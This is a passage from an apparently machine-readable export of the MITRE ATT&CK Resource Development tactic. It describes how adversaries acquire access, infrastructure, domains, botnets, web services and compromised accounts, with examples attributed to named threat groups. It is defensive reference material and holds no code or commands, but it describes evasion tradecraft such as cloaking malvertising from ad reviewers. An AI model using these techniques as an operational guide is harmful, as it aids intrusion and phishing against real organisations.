certificates to help with Defense Evasion.", "id": "TA0042", "techniques": [{"name": "Acquire Access", "description": "Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems. In some cases, adversary groups may form partnerships to share compromised systems with each other.", "detailed_description": "Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems. In some cases, adversary groups may form partnerships to share compromised systems with each other.\nFootholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., Web Shell) or established access via External Remote Services. In some cases, access brokers will implant compromised systems with a \"load\" that can be used to install additional malware for paying customers.\nBy leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.\nIn some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a Trusted Relationship, Multi-Factor Authentication Interception, or even Supply Chain Compromise.\nNote: while this technique is distinct from other behaviors such as Purchase Technical Data and Credentials, they may often be used in conjunction (especially where the acquired foothold requires Valid Accounts).", "id": "T1650", "examples": [], "sub_techniques": []}, {"name": "Acquire Infrastructure", "description": "Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost. Additionally, botnets are available for rent or purchase.", "detailed_description": "Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost. Additionally, botnets are available for rent or purchase.\nUse of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support Proxy, including from residential proxy services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.", "id": "T1583", "examples": [{"id": "G1030", "name": "Agrius", "description": "Agrius typically uses commercial VPN services for anonymizing last-hop traffic to victim networks, such as ProtonVPN."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear uses services such as IVPN, SurfShark, and Tor to add anonymization to operations."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has purchased access to victim VPNs to facilitate access to victim environments."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used funds from stolen and laundered cryptocurrency to acquire operational infrastructure."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team used various third-party email campaign management services to deliver phishing emails."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has used HubSpot and MailerLite marketing platform services to hide the true sender of phishing emails."}], "sub_techniques": [{"name": "Domains", "description": "Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.", "detailed_description": "Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\nAdversaries may use acquired domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control. Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). Typosquatting may be used to aid in delivery of payloads via Drive-by Compromise. Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.\nDifferent URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.\nIn addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actor\u2019s choosing.", "id": "T1583.001", "examples": [{"id": "G0006", "name": "APT1", "description": "APT1 has registered hundreds of domains for use in operations."}, {"id": "G0007", "name": "APT28", "description": "APT28 registered domains imitating NATO, OSCE security websites, Caucasus information resources, and other organizations."}, {"id": "G0050", "name": "APT32", "description": "APT32 has set up and operated websites to gather information and deliver malware."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has registered a variety of domains to host malicious payloads and for C2."}, {"id": "C0010", "name": "C0010", "description": "For C0010, UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer."}, {"id": "C0011", "name": "C0011", "description": "For C0011, Transparent Tribe registered domains likely designed to appear relevant to student targets in India."}, {"id": "C0021", "name": "C0021", "description": "For C0021, the threat actors registered domains for use in C2."}, {"id": "C0026", "name": "C0026", "description": "For C0026, the threat actors re-registered expired C2 domains previously used for ANDROMEDA malware."}, {"id": "C0004", "name": "CostaRicto", "description": "For CostaRicto, the threat actors established domains, some of which appeared to spoof legitimate domains."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM created domains to facilitate strategic website compromise and credential capture activities."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate command and control includes hard-coded domains in the malware chosen to masquerade as legitimate services such as Akamai CDN or Amazon Web Services."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has registered domains for targeting intended victims."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has registered domains, intended to look like legitimate target domains, that have been used in watering hole attacks."}, {"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY has registered domains to spoof targeted organizations by changing the top-level domain (TLD) to \".us\", \".co\" or \".biz\"."}, {"id": "G0137", "name": "Ferocious Kitten", "description": "Ferocious Kitten has acquired domains imitating legitimate sites."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has registered look-alike domains for use in phishing campaigns."}, {"id": "C0007", "name": "FunnyDream", "description": "For FunnyDream, the threat actors registered a variety of domains."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has registered multiple domains to facilitate payload staging and C2."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has registered and operated domains for campaigns, often using a security or web technology theme or impersonating the targeted organization."}, {"id": "G0136", "name": "IndigoZebra", "description": "IndigoZebra has established domains, some of which were designed to look like official government domains, for their operations."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has registered domains to spoof targeted organizations and trusted third parties including search engines, web platforms, and cryptocurrency exchanges."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has acquired domains related to their campaigns to act as distribution points and C2 channels."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has used dynamic DNS providers to create legitimate-looking subdomains for C2."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has established domains that impersonate legitimate entities to use for targeting efforts. "}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has registered fraudulent domains such as \"mail-newyorker.com\" and \"news12.com.recover-session-service.site\" to target specific victims with phishing attacks."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has registered malicious domains for use in intrusion campaigns."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet registered domains to develop effective personas for fake companies used in phishing activity."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda have acquired C2 domains prior to operations."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group registered a domain name identical to that of a compromised company as part of their BEC effort."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "For Operation Dust Storm, the threat actors established domains as part of their operational infrastructure."}, {"id": "C0023", "name": "Operation Ghost", "description": "For Operation Ghost, APT29 registered domains for use in C2 including some crafted to appear as existing legitimate domains."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, threat actors registered domains for C2."}, {"id": "C0005", "name": "Operation Spalax", "description": "For Operation Spalax, the threat actors registered hundreds of domains using Duck DNS and DNS Exit."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin uses newly-registered domains containing only a few characters for command and controll purposes, such as \"v0[.]cx\"."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has registered domain names and created URLs that are often designed to mimic or spoof legitimate websites, such as email login pages, online file sharing and storage websites, and password reset pages, while also hosting these items on legitimate, compromised network infrastructure."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has acquired domains to establish credential harvesting pages, often spoofing the target organization and using free top level domains .TK, .ML, .GA, .CF, and .GQ."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "For the SolarWinds Compromise, APT29 acquired C2 domains, sometimes through resellers."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has registered domains using randomized words and with names resembling legitimate organizations."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has registered domains often containing the keywords \"kimjoy,\" \"h0pe,\" and \"grace,\" using domain registrars including Netdorm and No-IP DDNS, and hosting providers including xTom GmbH and Danilenko, Artyom."}, {"id": "G0092", "name": "TA505", "description": "TA505 has registered domains to impersonate services such as Dropbox to distribute malware."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has obtained domains to host their payloads."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has registered domains for C2."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe has registered domains to mimic file sharing, government, defense, and research websites for use in targeted campaigns."}, {"id": "G0044", "name": "Winnti Group", "description": "Winnti Group has registered domains for C2 that mimicked sites of their intended targets."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern registered domains mimicking other entities throughout various campaigns."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has purchased domains for use in targeted campaigns."}]}, {"name": "DNS Server", "description": "Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.", "detailed_description": "Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.\nBy running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic (DNS). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.", "id": "T1583.002", "examples": [{"id": "G0001", "name": "Axiom", "description": "Axiom has acquired dynamic DNS services for use in the targeting of intended victims."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has set up custom DNS servers to send commands to compromised hosts via TXT records."}]}, {"name": "Virtual Private Server", "description": "Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.", "detailed_description": "Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.", "id": "T1583.003", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 hosted phishing domains on free services for brief periods of time during campaigns."}, {"id": "G0001", "name": "Axiom", "description": "Axiom has used VPS hosting providers in targeting of intended victims."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used Virtual Private Server (VPS) infrastructure."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM created virtual private server instances to facilitate use of malicious domains and other items."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has acquired VPS infrastructure for use in malicious campaigns."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used virtual private servers (VPSs) to host tools, perform reconnaissance, exploit victim infrastructure, and as a destination for data exfiltration."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used VPS hosting providers for infrastructure outside of Russia."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has operated from leased virtual private servers (VPS) in the United States."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity used acquired Virtual Private Servers as control systems for devices infected with KV Botnet malware."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has used VPS hosting providers for infrastructure."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet registered virtual private servers to host payloads for download."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern used adversary-owned and -controlled servers to host web vulnerability scanning applications."}]}, {"name": "Server", "description": "Adversaries may buy, lease, rent, or obtain physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in Drive-by Compromise, enabling Phishing operations, or facilitating Command and Control. Instead of compromising a third-party Server or renting a Virtual Private Server, adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused.", "detailed_description": "Adversaries may buy, lease, rent, or obtain physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in Drive-by Compromise, enabling Phishing operations, or facilitating Command and Control. Instead of compromising a third-party Server or renting a Virtual Private Server, adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused.\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.", "id": "T1583.004", "examples": [{"id": "G1012", "name": "CURIUM", "description": "CURIUM has created dedicated servers for command and control and exfiltration purposes."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has acquired multiple servers for some of their operations, using each server for a different role."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM has used Taiwan-based servers that appear to be exclusive to GALLIUM."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has purchased hosting servers with virtual currency and prepaid cards."}, {"id": "G1020", "name": "Mustard Tempest", "description": "Mustard Tempest has acquired servers to host second-stage payloads that remain active for a period of either days, weeks, or months."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors purchased hosted services to use for C2."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group acquired servers to host their malicious tools."}, {"id": "C0006", "name": "Operation Honeybee", "description": "For Operation Honeybee, at least one identified persona was used to register for a free account for a control server."}, {"id": "C0014", "name": "Operation Wocao", "description": "For Operation Wocao, the threat actors purchased servers with Bitcoin to use during the operation."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations."}]}, {"name": "Botnet", "description": "Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).", "detailed_description": "Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).", "id": "T1583.005", "examples": []}, {"name": "Web Services", "description": "Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.", "detailed_description": "Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.", "id": "T1583.006", "examples": [{"id": "G0025", "name": "APT17", "description": "APT17 has created profile pages in Microsoft TechNet that were used as C2 infrastructure."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used newly-created Blogspot pages for credential harvesting operations."}, {"id": "G0016", "name": "APT29", "description": "APT29 has registered algorithmically generated Twitter handles that are used for C2 by malware, such as HAMMERTOSS. APT29 has also used legitimate web services such as Dropbox and Constant Contact in their operations."}, {"id": "G0050", "name": "APT32", "description": "APT32 has set up Dropbox, Amazon S3, and Google Drive to host malicious downloads."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has obtained cloud storage service accounts to host stolen data."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has established GitHub accounts to host their malware."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has set up Amazon S3 buckets to host trojanized digital products."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has acquired web services for use in C2 and exfiltration."}, {"id": "G0136", "name": "IndigoZebra", "description": "IndigoZebra created Dropbox accounts for their operations."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has hosted content used for targeting efforts via web services such as Blogspot."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has hosted malicious downloads on Github."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has established GitHub accounts to host its toolsets."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has acquired Amazon S3 buckets to use in C2."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used file sharing services including OneHub, Sync, and TeraBox to distribute tools."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used file hosting services like DropBox and OneDrive."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "For Operation Sharpshooter, the threat actors used Dropbox to host lure documents and their first-stage downloader."}, {"id": "G1005", "name": "POLONIUM", "description": "POLONIUM has created and used legitimate Microsoft OneDrive accounts for their operations."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear has leveraged the Discord content delivery network to host malicious content for retrieval during initial access operations."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has hosted malicious files on various platforms including Google Drive, OneDrive, Discord, PasteText, ShareText, and GitHub."}, {"id": "G1038", "name": "TA578", "description": "TA578 has used Google Firebase to host malicious scripts."}, {"id": "G0010", "name": "Turla", "description": "Turla has created web accounts including Dropbox and GitHub for C2 and document exfiltration."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used GitHub to host malware linked in spearphishing e-mails."}]}, {"name": "Serverless", "description": "Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.", "detailed_description": "Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to Hide Infrastructure.", "id": "T1583.007", "examples": [{"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used infrastructure hosted behind Cloudflare or utilized Cloudflare Workers for command and control."}]}, {"name": "Malvertising", "description": "Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements. Purchased ads may also target specific audiences using the advertising network\u2019s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites.", "detailed_description": "Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements. Purchased ads may also target specific audiences using the advertising network\u2019s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites.\nAdversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software. Adversary\u2019s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.\nMalvertising may be used to support Drive-by Target and Drive-by Compromise, potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.\nAdversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement. Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.", "id": "T1583.008", "examples": [{"id": "G1020", "name": "Mustard Tempest", "description": "Mustard Tempest has posted false advertisements including for software packages and browser updates in order to distribute malware."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin variants have been delivered via malicious advertising items that, when interacted with, download a malicious archive file containing the initial payload, hosted on services such as Discord."}]}]}, {"name": "Compromise Accounts", "description": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. Establish Accounts), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona.", "detailed_description": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. Establish Accounts), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona.\nA variety of methods exist for compromising accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\nAdversaries may directly leverage compromised email accounts for Phishing for Information or Phishing.", "id": "T1586", "examples": [], "sub_techniques": [{"name": "Social Media Accounts", "description": "Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. Social Media Accounts), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona.", "detailed_description": "Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. Social Media Accounts), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona.\nA variety of methods exist for compromising social media accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps). Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others. Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).", "id": "T1586.001", "examples": [{"id": "G0065", "name": "Leviathan", "description": "Leviathan has compromised social media accounts to conduct social engineering attacks."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team creates credential capture webpages to compromise existing, legitimate social media accounts."}]}, {"name": "Email Accounts", "description": "Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct Phishing for Information, Phishing, or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: Domains).", "detailed_description": "Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct Phishing for Information, Phishing, or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: Domains).\nA variety of methods exist for compromising email accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or Phishing emails may evade reputation-based email filtering rules.\nAdversaries can use a compromised email account to hijack existing email threads with targets of interest.", "id": "T1586.002", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used compromised email accounts to send credential phishing emails."}, {"id": "G0016", "name": "APT29", "description": "APT29 has compromised email accounts to further enable phishing campaigns and taken control of dormant accounts."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used compromised accounts to send spearphishing emails."}, {"id": "G0136", "name": "IndigoZebra", "description": "IndigoZebra has compromised legitimate email accounts to use in their spearphishing operations."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has compromised email accounts to send spearphishing e-mails."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has payed employees, suppliers, and business partners of target organizations for credentials."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has compromised email accounts to conduct social engineering attacks."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has compromised personal email accounts through the use of legitimate credentials and gathered additional victim information."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has used compromised email accounts to conduct spearphishing against contacts of the original victim."}, {"id": "G1037", "name": "TA577", "description": "TA577 has sent thread hijacked messages from compromised emails."}]}, {"name": "Cloud Accounts", "description": "Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Additionally, cloud-based messaging services such as Twilio, SendGrid, AWS End User Messaging, AWS SNS (Simple Notification Service), or AWS SES (Simple Email Service) may be leveraged for spam or Phishing. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.", "detailed_description": "Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Additionally, cloud-based messaging services such as Twilio, SendGrid, AWS End User Messaging, AWS SNS (Simple Notification Service), or AWS SES (Simple Email Service) may be leveraged for spam or Phishing. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.\nA variety of methods exist for compromising cloud accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, conducting Password Spraying attacks, or attempting to Steal Application Access Tokens. Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a Trusted Relationship between service providers and their customers.", "id": "T1586.003", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has used residential proxies, including Azure Virtual Machines, to obfuscate their access to victim environments."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used compromised Google Workspace accounts for command and control."}]}]}, {"name": "Compromise Infrastructure", "description": "Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle. Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.", "detailed_description": "Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle. Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\nUse of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with Digital Certificates) to further blend in and support staged information gathering 